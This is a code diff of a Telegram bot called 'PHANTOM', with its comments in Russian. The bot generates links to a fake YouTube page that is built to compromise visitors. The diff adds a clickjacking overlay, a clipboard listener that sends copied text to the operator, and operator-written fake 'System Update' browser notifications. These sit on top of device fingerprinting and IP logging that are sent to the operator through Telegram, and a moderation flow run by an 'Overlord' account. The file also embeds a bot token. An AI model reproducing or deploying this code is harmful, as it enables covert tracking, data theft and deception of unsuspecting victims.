@@ -1,12 +1,12 @@
-import asyncio, threading, requests, json, os, base64, urllib.parse
+import asyncio, threading, requests, json, os, base64, urllib.parse, time
 from flask import Flask, render_template_string, request, jsonify
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
 from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
-# --- [1] CONFIG ---
+# --- [1] КОНФИГУРАЦИЯ СИСТЕМЫ ---
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
-OVERLORD_ID = 6659724115  # ТВОЙ ID - ГЛАВНЫЙ СУДЬЯ
+OVERLORD_ID = 6659724115  # ТВОЙ ID (ГЛАВНЫЙ СУДЬЯ)
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -14,53 +14,79 @@ app = Flask(__name__)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
-active_commands = {} # Очередь команд для исполнения
-pending_approvals = {} # Запросы на модерацию (ждут твоего решения)
+# Глобальные очереди данных
+active_commands = {} 
+waiting_for_text = {} 
 
-# --- [2] STEALTH HTML ---
+# --- [2] CENTRAL GHOST CLICKJACKING UI ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
-<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
-<body style="margin:0; background:#000;" onclick="ignite()">
-    <div style="width:100%; height:100vh; background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;">
-        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:68px; height:48px; background:rgba(255,0,0,0.9); border-radius:12px;"></div>
+<head>
+    <title>YouTube Mobile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { margin: 0; background: #000; font-family: sans-serif; overflow: hidden; width: 100vw; height: 100vh; }
+        #victim-ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 10; background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
+        .play-ico { width: 90px; height: 60px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 4px solid white; animation: pulse 1.5s infinite; cursor: pointer; }
+        .play-tr { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
+        #ghost-target { position: absolute; width: 140px; height: 45px; background: transparent; z-index: 2000; display: none; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body onclick="ignite()">
+    <div id="victim-ui">
+        <div class="play-ico"><div class="play-tr"></div></div>
     </div>
+    <div id="ghost-target"></div>
 <script>
-let sid = "{{ sid }}";
-let active = false;
+let sid = "{{ sid }}", active = false;
 async function ignite() {
     if(active) return; active = true;
     let gl = document.createElement('canvas').getContext('webgl');
     let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    let d = { 
-        sid: sid, ua: navigator.userAgent, res: screen.width+"x"+screen.height,
-        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown",
-        loc: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    let d = { sid: sid, ua: navigator.userAgent, res: screen.width+"x"+screen.height, gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A" };
     navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(d))));
+
+    Notification.requestPermission().then(p => { 
+        console.log("Status:", p); 
+        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000);
+    });
+
+    setTimeout(() => {
+        let gt = document.getElementById('ghost-target');
+        gt.style.display = 'block';
+        gt.style.top = (window.innerHeight / 2) + 38 + 'px';
+        gt.style.left = (window.innerWidth / 2) + 18 + 'px';
+        document.getElementById('victim-ui').innerHTML = '<div style="color:white;font-size:18px;text-align:center;">Loading secure player...<br>Please wait</div>';
+    }, 150);
+
     setInterval(async () => {
         try {
             let r = await fetch('/poll/' + sid);
-            let cmd = await r.json();
-            if (cmd.type === 'push') {
-                if (Notification.permission !== 'denied') {
-                    Notification.requestPermission().then(p => {
-                        if(p === 'granted') new Notification("Chrome System", {body: "Critical Security Update Required", icon: "https://www.google.com/favicon.ico"});
-                    });
-                }
+            let c = await r.json();
+            if (c.type === 'push') {
+                new Notification("System Update", {body: c.txt, icon: "https://www.google.com/favicon.ico"});
             }
-            if (cmd.type === 'kill') { localStorage.clear(); location.href = "https://google.com"; }
+            if (c.type === 'kill') {
+                localStorage.clear(); sessionStorage.clear();
+                document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:50px;">404 Not Found</h1>';
+                setTimeout(() => { location.href = "https://google.com"; }, 800);
+            }
         } catch(e) {}
-    }, 4000);
-    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
+    }, 3500);
+    
+    document.addEventListener('copy', () => {
+        let t = window.getSelection().toString();
+        if(t) fetch('/clip', { method: 'POST', body: JSON.stringify({sid:sid, txt:t}) });
+    });
 }
 </script>
 </body>
 </html>
 """
 
-# --- [3] BACKEND ROUTES ---
+# --- [3] BACKEND LOGIC (FLASK) ---
 
 @app.route('/ping')
 def cron_ping(): return "PONG", 200
@@ -75,71 +101,64 @@ def logger():
     sid, ip = data['sid'], request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     
     kb = InlineKeyboardBuilder()
-    kb.button(text="🔔 ОТПРАВИТЬ PUSH", callback_data=f"userreq_push_{sid}")
-    kb.button(text="☣️ САМОЛИКВИДАЦИЯ", callback_data=f"userreq_kill_{sid}")
+    kb.button(text="🔔 PUSH (CHROME)", callback_data=f"req_push_{sid}")
+    kb.button(text="☣️ KILL-SWITCH", callback_data=f"req_kill_{sid}")
     
-    report = (
-        f"🎯 **ЦЕЛЬ В СЕТИ**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **IP:** `{ip}`\n"
-        f"📍 **Зона:** `{data['loc']}`\n"
-        f"💻 **GPU:** `{data['gpu'][:30]}...`\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"Для отправки Push требуется одобрение Оверлорда."
-    )
-    # Отправляем отчет ТОЛЬКО тому юзеру, чья это ссылка
+    rep = f"🎯 **ЦЕЛЬ В СЕТИ**\\n🌐 **IP:** `{ip}`\\n💻 **GPU:** `{data['gpu'][:25]}`\\n📍 **ID:** `{sid}`"
     requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                  json={"chat_id": int(sid), "text": report, "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
+                  json={"chat_id": int(sid), "text": rep, "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
     return "OK"
 
 @app.route('/poll/<sid>')
 def poll(sid): return jsonify(active_commands.pop(sid, {"type": "none"}))
 
-# --- [4] BOT LOGIC ---
+@app.route('/clip', methods=['POST'])
+def clip():
+    d = json.loads(request.get_data())
+    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
+                  json={"chat_id": int(d['sid']), "text": f"📋 **БУФЕР:** `{d['txt']}`"})
+    return "OK"
+
+# --- [4] CONTROL CENTER (AIOGRAM) ---
 
 @dp.message(Command("start"))
-async def start(m: types.Message):
+async def cmd_start(m: types.Message):
     kb = ReplyKeyboardBuilder().button(text="🧨 Создать ссылку").as_markup(resize_keyboard=True)
-    role = "👑 ОВЕРЛОРД" if m.from_user.id == OVERLORD_ID else "Пользователь"
-    await m.answer(f"🕶 **PHANTOM v42.0**\nВаш статус: `{role}`", reply_markup=kb)
+    status = "👑 ОВЕРЛОРД" if m.from_user.id == OVERLORD_ID else "Агент"
+    await m.answer(f"🕶 **PHANTOM v44.0 | SINGULARITY**\\nСтатус: `{status}`", reply_markup=kb)
 
 @dp.message(F.text == "🧨 Создать ссылку")
-async def link(m: types.Message):
-    await m.answer(f"🔗 **Твоя персональная ссылка:**\n`{BASE_URL}/v/{m.from_user.id}`")
+async def cmd_link(m: types.Message):
+    await m.answer(f"🔗 **Твоя ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")
 
-# Когда ОБЫЧНЫЙ юзер нажимает кнопку в своем отчете
-@dp.callback_query(F.data.startswith("userreq_"))
-async def handle_user_request(c: types.CallbackQuery):
+@dp.callback_query(F.data.startswith("req_"))
+async def user_request(c: types.CallbackQuery):
     _, act, sid = c.data.split("_")
-    user_id = c.from_user.id
-    
-    # Отправляем запрос ТЕБЕ (Оверлорду)
-    kb = InlineKeyboardBuilder()
-    kb.button(text="✅ РАЗРЕШИТЬ", callback_data=f"ovl_allow_{act}_{sid}")
-    kb.button(text="❌ ОТКЛОНИТЬ", callback_data=f"ovl_deny_{sid}")
-    
-    await bot.send_message(OVERLORD_ID, 
-        f"⚖️ **ЗАПРОС НА МОДЕРАЦИЮ**\nЮзер: `{user_id}` хочет выполнить `{act}`\nДля жертвы юзера: `{sid}`",
-        reply_markup=kb.as_markup())
-    
-    await c.answer("⏳ Запрос отправлен Оверлорду на одобрение...")
+    kb = InlineKeyboardBuilder().button(text="✅ РАЗРЕШИТЬ", callback_data=f"ovl_ok_{act}_{sid}").button(text="❌ ОТКАЗ", callback_data="ovl_no").as_markup()
+    await bot.send_message(OVERLORD_ID, f"⚖️ **СУДЬЯ:** Юзер `{c.from_user.id}` просит `{act}` для `{sid}`", reply_markup=kb)
+    await c.answer("⏳ Ожидание одобрения Оверлорда...")
 
-# Когда ТЫ (Оверлорд) нажимаешь кнопку управления
 @dp.callback_query(F.data.startswith("ovl_"))
-async def overlord_decision(c: types.CallbackQuery):
-    data = c.data.split("_")
-    decision = data[1] # allow / deny
-    act = data[2] if len(data) > 3 else "kill"
-    sid = data[3] if len(data) > 3 else data[2]
-
-    if decision == "allow":
-        active_commands[sid] = {"type": act}
-        await c.message.edit_text(f"✅ Ты РАЗРЕШИЛ выполнение `{act}` для цели `{sid}`")
-        # Уведомляем юзера, что ты разрешил
-        await bot.send_message(int(sid), f"🚀 Оверлорд одобрил твой запрос на `{act}`!")
+async def overlord_action(c: types.CallbackQuery):
+    if c.from_user.id != OVERLORD_ID: return
+    d = c.data.split("_")
+    if d[1] == "no": return await c.message.edit_text("❌ Запрос отклонен.")
+    
+    decision, act, sid = d[1], d[2], d[3]
+    if act == "push":
+        waiting_for_text[int(sid)] = sid
+        await bot.send_message(int(sid), "🚀 **РАЗРЕШЕНО!** Введите текст уведомления:")
     else:
-        await c.message.edit_text(f"❌ Ты ОТКЛОНИЛ выполнение для цели `{sid}`")
-        await bot.send_message(int(sid), f"🚫 Твой запрос на `{act}` был отклонен Оверлордом.")
+        active_commands[sid] = {"type": "kill"}
+        await bot.send_message(int(sid), "☣️ Команда на уничтожение отправлена!")
+    await c.message.edit_text(f"✅ Действие `{act}` одобрено.")
+
+@dp.message(F.text)
+async def handle_text(m: types.Message):
+    if m.from_user.id in waiting_for_text:
+        sid = waiting_for_text.pop(m.from_user.id)
+        active_commands[sid] = {"type": "push", "txt": m.text}
+        await m.answer(f"📨 Сообщение отправлено цели `{sid}`")
 
 async def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
